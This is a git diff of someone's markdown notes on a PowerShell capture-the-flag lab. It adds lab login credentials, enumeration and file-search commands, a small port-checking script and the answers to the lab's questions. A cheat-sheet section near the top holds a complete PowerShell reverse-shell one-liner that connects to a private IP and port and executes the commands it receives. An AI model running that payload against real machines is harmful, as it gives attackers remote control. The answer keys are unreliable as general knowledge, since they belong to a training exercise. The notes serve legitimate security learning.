@@ -12,6 +12,16 @@
 - Username: Administrator
 - Password: BHN2UVw0Q
 
+## Cheat Sheets
+** Powershell WGET **
+
+`wget http://blog.stackexchange.com/ -OutFile out.html`
+
+** Powershell Reverse Shell **
+
+`powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.9.26.195',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+
 ## 1/6 Objectives
 Q1. Deploy the machine
 
@@ -75,6 +85,14 @@ Notes: I originally had an easier way to do this, but I can't seem to remember h
 > Answer: ihopeyoudidthisonwindows
 
 ## 4/6 Enumeration
+This section focuses on enumeration.  Single commandline syntax that pulls information.  The following are enumerated:
+- users
+- basic networking information
+- file permissions
+- registry permissions
+- scheduled and running tasks
+- insecure files
+
 **Q1.** How many users are there on the machine
 
 Notes: I used help user to find the cmdlet
@@ -135,17 +153,18 @@ Notes:
 
 **Q10.** Find the contents of a backup file
 
-Notes:
+Notes: It turns out bak is the extension, but it's in the middle of the file name.  I kept looking for a file extension vice just any pattern with "bak"
 
-`PS>`
-> Answer:
+`PS> Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue`
+`PS> Get-Content "C:\Program Files (x86)\Internet Explorer\passwords.bak.txt"`
+> Answer: backpassflag
 
 **Q11.** Search for all files containing API_KEY
 
-Notes:
+Notes: I ran the correct ocmmand, but it's taking way too long
 
-`PS>`
-> Answer:
+`PS> Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY`
+> Answer: fakekey123
 
 **Q12.** What command do you do to list all the running processes?
 
@@ -163,32 +182,56 @@ Notes:
 
 **Q14.** Who is the owner of the C:\
 
-Notes:
+Notes: It took a little bit, but easier than I thought.  I originally tried get-disk, but it displays specific hardware information.  
 
-`PS>`
->
+`PS> get-acl`
+> Answer: NT SERVICE\TrustedInstaller
 
 ## 5/6: basic Scripting Challenge
+Now we get into scripting.  
+
+Additional reading: [Learn X in Y minutes](https://learnxinyminutes.com/docs/powershell/)
+
+`
+$system_ports = Get-NetTCPConnection -State Listen
+
+$text_port = Get-Content -Path C:\Users\Administrator\Desktop\ports.txt
+
+foreach($port in $text_port){
+
+    if($port -in $system_ports.LocalPort){
+
+            echo $port
+
+                 
+    }
+
+    
+}
+`
+
+** I answered the questions with the one-liner.  Defeating the purpose of this exercise.  I'm going to stop here for today and work on powershell scripting the answers **
+
 **Q1.** What file contains the password?
 
 Notes:
 
-`PS>`
-> Answer:
+`PS> Get-ChildItem "C:\Users\Administrator\Desktop\emails" -recurse | select-String -pattern password`
+> Answer: Doc3M.txt
 
 **Q2.** What is the password?
 
 Notes:
 
-`PS>`
-> Answer:
+`PS> Get-ChildItem "C:\Users\Administrator\Desktop\emails" -recurse | select-String -pattern password`
+> Answer: johnisalegend99
 
 **Q3.** What files contains an HTTPS link?
 
 Notes:
 
-`PS>`
-> Answer:
+`PS> Get-ChildItem "C:\Users\Administrator\Desktop\emails" -recurse | select-String -pattern https`
+> Answer: Doc2Mary
 
 ## 6/6: Intermediate Scripting
 
